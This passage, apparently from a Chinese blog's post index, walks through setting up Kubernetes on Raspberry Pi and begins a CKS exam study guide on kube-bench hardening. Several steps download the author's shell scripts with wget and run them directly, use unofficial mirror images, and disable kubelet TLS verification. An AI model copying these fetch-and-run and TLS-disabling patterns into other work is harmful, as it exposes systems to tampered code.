下载树莓派专用的烧录的软件，安装后，打开软件。<br><img src=\"/linkimage/setupk8s/pi-imager.png\" alt=\"cluster-device\"><br>在【选择系统】的选择中，依次选择[Other general-purpose OS]，[ubuntu]，[Ubuntu Server 21.10 (RPi 3/4/400)]，在【sd卡】的选择中选中你的sd卡。然后点烧录就可以了。<br>如果你有自己的刷写软件，可以先下载<a href=\"https://ubuntu.com/download/raspberry-pi/thank-you?version=21.10&architecture=server-arm64+raspi\">系统镜像</a> ,随后通过你自己的刷写软件写到sd卡中就可以了。比如我的linux mint，只需要右键下载的镜像，选择”使用 磁盘映像写入器 打开“就可以打开磁盘工具的恢复磁盘映像功能来写入镜像,如下图。</p>\n<p><img src=\"/linkimage/setupk8s/mint-open-writer.png\" alt=\"cluster-device\"></p>\n<p><img src=\"/linkimage/setupk8s/mint-write-image.png\" alt=\"cluster-device\"></p>\n<h2 id=\"配置系统\"><a href=\"#配置系统\" class=\"headerlink\" title=\"配置系统\"></a>配置系统</h2><p>这一步一个是要完成登录密码和ip地址和wifi密码的配置，以便我们能通过ssh连接上去。另一个是配置hostname，便于区别不同的设备。</p>\n<p>在配置前，我们需要先设计一下我们3个树莓派的ip地址和hostname。<br>假设局域网的网段是192.168.3.0/24, 那么我们可以指定3个空闲的ip，比如192.168.3.151,192.168.3.152,192.168.3.153。然后hostname可以指定为master1，worker1，worker2。所以3个机器分别为:</p>\n<table>\n<thead>\n<tr>\n<th>机器信息</th>\n<th>hostname</th>\n<th>ip</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>master node</td>\n<td>server1</td>\n<td>192.168.3.151</td>\n</tr>\n<tr>\n<td>worker node1</td>\n<td>server2</td>\n<td>192.168.3.152</td>\n</tr>\n<tr>\n<td>worker node2</td>\n<td>server3</td>\n<td>192.168.3.153</td>\n</tr>\n</tbody></table>\n<p>然后我们以master node为例来配置hostname和ip。<br>在sd卡刚刷写完后，sd卡实际上是被分成两个区的，其中有一个system-boot分区，是可编辑的。<br>我们把刷写完的sd卡重新插到电脑上，然后挂载system-boot分区。<br>linux mint上我们可以通过”磁盘“工具直接通过界面操作来挂载分区，如图：</p>\n<p><img src=\"/linkimage/setupk8s/mint-mount-sd-ui.png\" alt=\"cluster-device\"></p>\n<p>也可以通过命令行，先fdisk -l查看设备信息，然后通过mount挂载就可以了，如图：</p>\n<p><img src=\"/linkimage/setupk8s/mint-mount-sd-commandline.png\" alt=\"cluster-device\"></p>\n<p>如上图所以，挂载完后我们能看到分区下有一个network-config文件，这个文件是用来配置系统首次启动时候的网络的。初始内容如下：</p>\n<p><img src=\"/linkimage/setupk8s/rpi-netplan-init.png\" alt=\"cluster-device\"></p>\n<p>我们根据我们网络和ip，改成如下：</p>\n<p><img src=\"/linkimage/setupk8s/rpi-netplan-overwrite.png\" alt=\"cluster-device\"></p>\n<p>wifi名字/wifi密码根据实际的填写。我使用了dhcp的方式连接wifi，按照<a href=\"https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#3-wifi-or-ethernet\">官方文档</a>应该是可以直接配成静态ip的，但是我每次配成静态之后设备都无法连到wifi中，不知道原因，所以就先配成dhcp的。</p>\n<p>改完配置文件，sd卡插到树莓派上去启动设备，这个时候我们登录到我们的路由器管理界面观察设备列表，找出hostname为ubuntu的设备，或者通过设备启动前和启动后的差别来找出设备的初始ip，然后我们通过ssh登录设备，初始用户名和密码都是ubuntu。登录后我们完成相应的配置：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh ubuntu@192.168.3.157  # 路由器管理界面找出来的设备初始ip</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 登录后自动强制让你设置新密码，改完后重新ssh上去</span></span><br><span class=\"line\"></span><br><span class=\"line\">ssh ubuntu@192.168.3.157</span><br><span class=\"line\"></span><br><span class=\"line\">cat &lt;&lt;EOF | sudo tee /etc/hostname</span><br><span class=\"line\">server1</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\">cp /etc/netplan/50-cloud-init.yaml ./  # backup</span><br><span class=\"line\">sudo vi /etc/netplan/50-cloud-init.yaml </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 把其中wifi下的配置改成如下</span></span><br><span class=\"line\">    wifis:</span><br><span class=\"line\">        wlan0:</span><br><span class=\"line\">            access-points:</span><br><span class=\"line\">                &quot;xxxxx&quot;:</span><br><span class=\"line\">                    password: &quot;yyyyy&quot;</span><br><span class=\"line\">            optional: true</span><br><span class=\"line\">            gateway4: 192.168.3.1</span><br><span class=\"line\">            nameservers:</span><br><span class=\"line\">                addresses: [192.168.3.1, 8.8.8.8]</span><br><span class=\"line\">            addresses: [192.168.3.151/24]</span><br><span class=\"line\"></span><br><span class=\"line\">sudo reboot # 重启生效</span><br><span class=\"line\">ssh ubuntu@192.168.3.151 # 用新的ip连上去</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"初始化系统准备安装\"><a href=\"#初始化系统准备安装\" class=\"headerlink\" title=\"初始化系统准备安装\"></a>初始化系统准备安装</h2><p>这一步我们需要做的是为安装k8s做准备，这一步我们可以脚本化了，不需要那么多手动的操作了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh ubuntu@192.168.3.151 # ssh上去</span><br><span class=\"line\">wget http://yizhi.ren/linkimage/setupk8s/step1.sh</span><br><span class=\"line\">sh step1.sh arm64  # 支持arm64|amd64两个值</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 输入sudo密码如果需要，确认[OK]如果需要</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 等待一杯茶的功夫，并确认中间没有报错, 如果脚本结束的很快，就要仔细确认是不是出错了</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 脚本会准备好全部需要的组件/库/配置，其中CNI使用的是containerd， kubernets的各种库和组件的版本是v1.22.1</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> CNI和kubernets版本没有抽成参数，要修改的话得改改脚本</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 最后输入y重启</span></span><br></pre></td></tr></table></figure>\n\n<p>我们通过上面一系列同样的步骤，把其他两个设备也准备好。</p>\n<h2 id=\"kubeadm安装master-node\"><a href=\"#kubeadm安装master-node\" class=\"headerlink\" title=\"kubeadm安装master node\"></a>kubeadm安装master node</h2><p>其实使用kubeadm建立k8s的master节点本身只是一行指令，但是其中涉及很多参数，还涉及国内拉不到谷歌镜像的问题，这个脚本化就是通过配置需要的参数，然后把组装参数和镜像拉取的事给自动化。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh ubuntu@192.168.3.151 # ssh上去</span><br><span class=\"line\">wget http://yizhi.ren/linkimage/setupk8s/step2.sh</span><br><span class=\"line\">vi step2.sh # 按需要配置以下几个参数</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">HOST1=192.168.3.151    <span class=\"comment\"># master node ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">HOST2=192.168.3.152    <span class=\"comment\"># worker node ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">HOST3=192.168.3.153    <span class=\"comment\"># worker node ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">DOMAIN=jinqidiguo.com  <span class=\"comment\"># 这个是给集群设置的域名，脚本会使用hosts来映射域名到HOST1的ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">POD_CIDR=10.244.0.0/16 <span class=\"comment\"># pod的ip池</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">SERVICE_CIDR=10.20.0.0/16  <span class=\"comment\"># service的ip池</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">bash step2.sh SETUPMASTER</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 不要用sh，有部分语法sh不支持</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 脚本已经解决了国内拉不到谷歌镜像的问题，使用的国内镜像</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 等待完成，如果顺利你将会看到下面的控制台输出</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Your Kubernetes control-plane has initialized successfully!</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ......</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> kubeadm join jinqidiguo.com:6443 --token br1b75.ierg26dgogbb9mhl \\</span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># \t--discovery-token-ca-cert-hash sha256:a4a94687aa61547f58f423d8722f824addb24f8a2158291dea3d26f0d92b72aa</span></span> </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ...</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 你需要记录下这两行kubeadm join指令，别的可以不关注。记下token和discovery-token-ca-cert-hash两个值</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> br1b75.ierg26dgogbb9mhl 和 sha256:a4a94687aa61547f58f423d8722f824addb24f8a2158291dea3d26f0d92b72aa 备用</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如果失败可以bash step2.sh RESET，然后修复后重试</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>到这，master节点就建设完成了，这时候你可以使用kubectl来操作集群了，当然现在集群只有一个节点。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> kubectl get node</span></span><br><span class=\"line\">NAME      STATUS     ROLES                  AGE   VERSION</span><br><span class=\"line\">server1   NotReady   control-plane,master   35m   v1.22.1</span><br></pre></td></tr></table></figure>\n\n<p>接下来需要安装CNI插件，由于CNI插件大家的安装倾向可能是很不一样的，所以没有做到脚本里。</p>\n<p>这里以weave为例(其他CNI插件请自己踩坑)，执行下面的命令来安装即可，注意env.IPALLOC_RANGE参数要跟step1.sh中配置的POD_CIDR值一致：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f &quot;https://cloud.weave.works/k8s/net?k8s-version=$(kubectl version | base64 | tr -d &#x27;\\n&#x27;)&amp;env.IPALLOC_RANGE=10.244.0.0/16&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>等待CNI启动成功后，node的状态会变成Ready：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> kubectl get node</span></span><br><span class=\"line\">NAME      STATUS   ROLES                  AGE   VERSION</span><br><span class=\"line\">server1   Ready    control-plane,master   65m   v1.22.1</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h2 id=\"kubeadm安装worker-node\"><a href=\"#kubeadm安装worker-node\" class=\"headerlink\" title=\"kubeadm安装worker node\"></a>kubeadm安装worker node</h2><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh ubuntu@192.168.3.152 # ssh上去</span><br><span class=\"line\">wget http://yizhi.ren/linkimage/setupk8s/step2.sh</span><br><span class=\"line\">vi step2.sh # 按需要配置以下几个参数</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">HOST1=192.168.3.151    <span class=\"comment\"># master node ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">HOST2=192.168.3.152    <span class=\"comment\"># worker node ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">HOST3=192.168.3.153    <span class=\"comment\"># worker node ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">DOMAIN=jinqidiguo.com  <span class=\"comment\"># 这个是给集群设置的域名，脚本会使用hosts来映射域名到HOST1的ip</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">POD_CIDR=10.244.0.0/16 <span class=\"comment\"># pod的ip池</span></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">SERVICE_CIDR=10.20.0.0/16  <span class=\"comment\"># service的ip池</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">sh step2.sh JOINWORKER br1b75.ierg26dgogbb9mhl sha256:a4a94687aa61547f58f423d8722f824addb24f8a2158291dea3d26f0d92b72aa</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 其中br1b75.ierg26dgogbb9mhl和sha256:a4a94687aa61547f58f423d8722f824addb24f8a2158291dea3d26f0d92b72aa来自上面master节点记录下来的两行信息</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 等待完成，看到这个信息就表示成功了</span></span><br><span class=\"line\">This node has joined the cluster:</span><br><span class=\"line\">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class=\"line\">* The Kubelet was informed of the new secure connection details.</span><br><span class=\"line\"></span><br><span class=\"line\">Run &#x27;kubectl get nodes&#x27; on the control-plane to see this node join the cluster.</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 这时到master节点执行kubectl get node就能看到worker节点了, STATUS状态可能还NotReady, 多等一会</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kubectl get node</span><br><span class=\"line\">NAME      STATUS     ROLES                  AGE     VERSION</span><br><span class=\"line\">server1   Ready      control-plane,master   6d22h   v1.22.1</span><br><span class=\"line\">server2   Ready      &lt;none&gt;                 2m3s    v1.22.1</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://thenewstack.io/a-guide-to-linux-operating-systems-for-kubernetes/\">a-guide-to-linux-operating-systems-for-kubernetes</a><br><a href=\"https://netplan.io/examples/\">Netplan configuration examples</a><br><a href=\"https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi\">How to install Ubuntu Server on your Raspberry Pi</a><br><a href=\"https://www.weave.works/docs/net/latest/kubernetes/kube-addon/#-changing-configuration-options\">Changing Configuration Options</a></p>\n","categories":["架构"],"tags":["kubernetes"]},{"title":"CKS知识总结","url":"/2022/02/09/cksknowledge/","content":"<h1 id=\"CKS知识总结\"><a href=\"#CKS知识总结\" class=\"headerlink\" title=\"CKS知识总结\"></a>CKS知识总结</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>CKS考试是kubernetes认证系列中中高级的一个证书，相比CKAD和CKA难度略大一些。</p>\n<p>一方面虽然CKS跟CKA和CKAD有部分交集，比如k8s的基本使用，RBAC/secret的使用，集群升级等知识点，另一方面又是基于CKA的基础之上，考试也要求先通过CKA。</p>\n<p>第二个相对难考的地方在于CKA和CKAD的考点都在kubernetes官网可以找到，但是CKS的很多知识点跳到了外部，涉及到外部的工具，外部的插件等等。</p>\n<p>第三个点是CKS的部分知识点需要自己做一定的探索，换句话说不操作一遍的话都不知道他是什么，他涉及到什么知识。</p>\n<p>同时，CKAD、CKA、CKS相同的点是都有前人为我们列好了考试大纲，列好了知识点和链接：<a href=\"https://github.com/walidshaari/Kubernetes-Certified-Administrator\">CKA</a>/<a href=\"https://github.com/dgkanatsios/CKAD-exercises\">CKAD</a>/<a href=\"https://github.com/walidshaari/Certified-Kubernetes-Security-Specialist\">CKS</a></p>\n<p>这里主要基于第3个难点，对涉及到的操作做一个细致的记录，方便大家参考，减少学习者的探索时间。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"搭建集群\"><a href=\"#搭建集群\" class=\"headerlink\" title=\"搭建集群\"></a>搭建集群</h2><p>由于操作性比较强，所以必然的需要一个可以操作和试验的集群，大家可以根据自己的喜好去搭建，可以去使用在线的云计算平台搭建，阿里云，腾讯云，gcloud等，也可以使用自己的机器去搭建，最少需要两个机器或者两个虚拟机。</p>\n<p>我提供一个在树莓派上搭建k8s的详细步骤，参考<a href=\"https://yizhi.ren/2022/01/25/setupk8s/\">树莓派搭建k8s集群</a>。</p>\n<p>后面的步骤会基于树莓派上搭建的集群来操作，集群由一个master和一个worker组成。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> kubectl get node</span></span><br><span class=\"line\">NAME      STATUS     ROLES                  AGE     VERSION</span><br><span class=\"line\">server1   Ready      control-plane,master   6d22h   v1.22.1</span><br><span class=\"line\">server2   Ready      &lt;none&gt;                 2m3s    v1.22.1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"安装-ingress\"><a href=\"#安装-ingress\" class=\"headerlink\" title=\"安装 ingress\"></a>安装 ingress</h2><p>ingress controller我们使用ingress-nginx. 在kuberetes官方github账户下存在两个ingress的repo，一个是<a href=\"https://github.com/kubernetes/ingress-gce\">ingress-gce</a>，一个是<a href=\"https://github.com/kubernetes/ingress-nginx\">ingress-nginx</a>，gce是给google cloud专用的，我们当然选择一个通用的ingress-nginx。</p>\n<p>ingress-nginx的安装原本是简单的一行指令，但是ingress-nginx的image国内无法访问，需要自己在hub.docker.com搜索别人同步过来的包并替换。</p>\n<p>所以安装ingress-nginx的步骤如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">拷贝这里的内容</span><br><span class=\"line\">https://github.com/kubernetes/ingress-nginx/blob/main/deploy/static/provider/baremetal/deploy.yaml</span><br><span class=\"line\"></span><br><span class=\"line\">然后把里面</span><br><span class=\"line\">k8s.gcr.io/ingress-nginx/controller:v1.1.0@sha256:f766669fdcf3dc26347ed273a55e754b427eb4411ee075a53f30718b4499076a</span><br><span class=\"line\">替换成</span><br><span class=\"line\">cangyin/ingress-nginx-controller:v1.1.0</span><br><span class=\"line\"></span><br><span class=\"line\">把里面的</span><br><span class=\"line\">k8s.gcr.io/ingress-nginx/kube-webhook-certgen:v1.1.1@sha256:64d8c73dca984af206adf9d6d7e46aa550362b1d7a01f3a0a91b20cc67868660</span><br><span class=\"line\">替换成</span><br><span class=\"line\">liangjw/kube-webhook-certgen:v1.1.1</span><br><span class=\"line\"></span><br><span class=\"line\">最后kubect apply -f deploy.yaml</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>当然网络没问题的情况下就直接:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://github.com/kubernetes/ingress-nginx/blob/main/deploy/static/provider/baremetal/deploy.yaml</span><br></pre></td></tr></table></figure>\n\n<p>成功后：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> kl get svc -n ingress-nginx</span></span><br><span class=\"line\">NAME                                 TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)                      AGE</span><br><span class=\"line\">ingress-nginx-controller             NodePort    10.20.148.137   &lt;none&gt;        80:31724/TCP,443:31447/TCP   20m</span><br><span class=\"line\">ingress-nginx-controller-admission   ClusterIP   10.20.160.241   &lt;none&gt;        443/TCP                      20m</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"安装metrics-server\"><a href=\"#安装metrics-server\" class=\"headerlink\" title=\"安装metrics server\"></a>安装metrics server</h2><p>同样，网络不通的情况下metrics server安装时镜像也需要换成hub.docker.com下的包。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml</span><br><span class=\"line\">然后编辑components.yaml，在args中添加--kubelet-insecure-tls参数</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> https://blog.csdn.net/tanjunchen/article/details/104762428</span></span><br><span class=\"line\"></span><br><span class=\"line\">然后替换image成kubeimages/metrics-server:v0.5.1</span><br><span class=\"line\"></span><br><span class=\"line\">再kubectl apply -f components.yaml</span><br></pre></td></tr></table></figure>\n\n<p>成功后：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> kl get svc -n kube-system</span></span><br><span class=\"line\">NAME             TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE</span><br><span class=\"line\">kube-dns         ClusterIP   10.20.0.10     &lt;none&gt;        53/UDP,53/TCP,9153/TCP   8d</span><br><span class=\"line\">metrics-server   ClusterIP   10.20.204.13   &lt;none&gt;        443/TCP                  18m</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"运行kube-bench\"><a href=\"#运行kube-bench\" class=\"headerlink\" title=\"运行kube-bench\"></a>运行kube-bench</h2><p>kube-bench用来检查集群有哪些配置不够安全。</p>\n<p>参考文档：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/aquasecurity/kube-bench/blob/main/docs/installation.md</span><br><span class=\"line\">https://github.com/aquasecurity/kube-bench/blob/main/docs/running.md</span><br></pre></td></tr></table></figure>\n\n<p>二进制安装：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> install</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 0.6.6开始支持arm了, 所以可以直接装到树莓派上</span></span><br><span class=\"line\">wget https://github.com/aquasecurity/kube-bench/releases/download/v0.6.6/kube-bench_0.6.6_linux_arm64.deb</span><br><span class=\"line\">sudo apt install ./kube-bench_0.6.6_linux_arm64.deb</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> execute</span></span><br><span class=\"line\">kube-bench  --config-dir /etc/kube-bench/cfg --config ./cfg/config.yaml</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 这是config默认路径，<span class=\"built_in\">help</span>中有</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> kube-bench不带参就是检查/etc/kube-bench/cfg/config.yaml。</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> -c 1.1.8 可以指定检查哪一项</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 结果可在控制台直接看到</span></span><br></pre></td></tr></table></figure>\n\n<p>yaml安装：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/aquasecurity/kube-bench.git</span><br><span class=\"line\">cd kube-bench</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> kubectl apply -f job-master.yaml</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> kubectl apply -f job-worker.yaml</span></span><br><span class=\"line\">kubectl apply -f job.yaml # 检查全部</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看结果</span></span><br><span class=\"line\"><span class=\"meta\">~/kube-bench$</span><span class=\"bash\"> kl get pod -A | grep kube-bench</span></span><br><span class=\"line\">default         kube-bench--1-ddvrh                         0/1     Completed   0               3m53s</span><br><span class=\"line\"><span class=\"meta\">~/kube-bench$</span><span class=\"bash\"> kl logs kube-bench--1-ddvrh</span></span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>你还需要下载一个pdf文档，这个文档会对每一个检查条目做详细的说明并给出问题的解决方法。</p>\n<p>到<a href=\"https://downloads.cisecurity.org/\">CIS下载网站</a>,定位到Kubernetes相关的下载项，下载”CIS Kubernetes V1.20 Benchmark v1.0.0”(你看到的时候版本可能不一样了)。</p>\n<p><img src=\"/linkimage/cksknowledge/kube-bench-k8s-pdf.png\" alt=\"CIS下载网站\"></p>\n<p>基于我前面使用kubeadm安装的集群，下面会列举出kube-bench测出来的一些问题。</p>\n<h3 id=\"设置权限\"><a href=\"#设置权限\" class=\"headerlink\" title=\"设置权限\"></a>设置权限</h3><h4 id=\"kubelet权限\"><a href=\"#kubelet权限\" class=\"headerlink\" title=\"kubelet权限\"></a>kubelet权限</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 644 /usr/lib/systemd/system/kubelet.service</span><br><span class=\"line\">chown root:root /usr/lib/systemd/system/kubelet.service</span><br><span class=\"line\">chmod 644 /etc/kubernetes/kubelet.conf</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"cni权限\"><a href=\"#cni权限\" class=\"headerlink\" title=\"cni权限\"></a>cni权限</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 644 /etc/cni/net.d/10-weave.conflist</span><br><span class=\"line\">chown root:root /etc/cni/net.d/10-weave.conflist</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"etcd权限\"><a href=\"#etcd权限\" class=\"headerlink\" title=\"etcd权限\"></a>etcd权限</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradd etcd</span><br><span class=\"line\">chown etcd:etcd /var/lib/etcd</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"kubelet配置参数\"><a href=\"#kubelet配置参数\" class=\"headerlink\" title=\"kubelet配置参数\"></a>kubelet配置参数</h3><h4 id=\"authentication\"><a href=\"#authentication\" class=\"headerlink\" title=\"authentication\"></a>authentication</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi /var/lib/kubelet/config.yaml</span><br><span class=\"line\"># ensure anonymous is false</span><br><span class=\"line\"># ensure clientCAFile is configured</span><br><span class=\"line\"></span><br><span class=\"line\">apiVersion: kubelet.config.k8s.io/v1beta1</span><br><span class=\"line\">authentication:</span><br><span class=\"line\">  anonymous:</span><br><span class=\"line\">    enabled: false</span><br><span class=\"line\">  webhook:</span><br><span class=\"line\">    cacheTTL: 0s</span><br><span class=\"line\">    enabled: true</span><br><span class=\"line\">  x509:</span><br><span class=\"line\">    clientCAFile: /etc/kubernetes/pki/ca.crt</span><br></pre></td></tr></table></figure>\n\n<p>注意上面的配置是kubeadm安装后默认的配置，没有什么问题。其中关于webhook的知识可以参考：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/webhook/</span><br><span class=\"line\">mode Webhook causes Kubernetes to query an outside REST service when determining user privileges.</span><br><span class=\"line\">也就是webhook会触发一个rest请求到外部服务来决定一个请求是否有权限。</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"protectKernelDefaults\"><a href=\"#protectKernelDefaults\" class=\"headerlink\" title=\"protectKernelDefaults\"></a>protectKernelDefaults</h4><p>protectKernelDefaults是决定k8s一个行为，当内核参数不满足k8s的期待的时候，k8s是报错还是修改内核参数。如果true就是报错，如果false就是修改。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">protectKernelDefaults, if true, causes the Kubelet to error if kernel </span><br><span class=\"line\">flags are not as it expects. Otherwise the Kubelet will attempt to </span><br><span class=\"line\">modify kernel flags to match its expectation.</span><br><span class=\"line\"></span><br><span class=\"line\">配置方法是 vi /var/lib/kubelet/config.yaml</span><br><span class=\"line\">并添加protectKernelDefaults: true </span><br><span class=\"line\">默认是false</span><br></pre></td></tr></table></figure>\n\n<p>k8s因为该参数启动失败报错的一个例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.ibm.com/docs/zh/cloud-private/3.1.2?topic=upgrade-kubelet-container-fails-start</span><br><span class=\"line\"></span><br><span class=\"line\">kubelet的protectKernelDefaults可能导致kubelet启动失败，错误信息类似：</span><br><span class=\"line\">hyperkube[804]: F1023 17:02:19.964867     804 kubelet.go:1333] Failed to start ContainerManager [Invalid kernel flag: vm/overcommit_memory, expected value: 1, actual value: 0, Invalid kernel flag: kernel/panic, expected value: 10, actual value: 0, Invalid kernel flag: kernel/panic_on_oops, expected value: 1, actual value: 0]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在我的集群中如果开启了就会报错。</p>\n<h4 id=\"eventRecordQPS-eventBurst\"><a href=\"#eventRecordQPS-eventBurst\" class=\"headerlink\" title=\"eventRecordQPS/eventBurst\"></a>eventRecordQPS/eventBurst</h4><p>这两个参数是对kubelet产生的event进行流控的(event会上报给apiserver)，eventRecordQPS是控制qps，eventBurst是控制令牌桶的桶大小。设小了会丢event，设大了对apiserver可能产生潜在压力，对于我们个人搭建的小集群，设大一点就可以了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/</span><br><span class=\"line\"></span><br><span class=\"line\">vi /var/lib/kubelet/config.yaml</span><br><span class=\"line\"># add below two lines</span><br><span class=\"line\">eventRecordQPS: 100</span><br><span class=\"line\">eventBurst: 200</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"apiserver配置参数\"><a href=\"#apiserver配置参数\" class=\"headerlink\" title=\"apiserver配置参数\"></a>apiserver配置参数</h3><h4 id=\"anonymous-auth\"><a href=\"#anonymous-auth\" 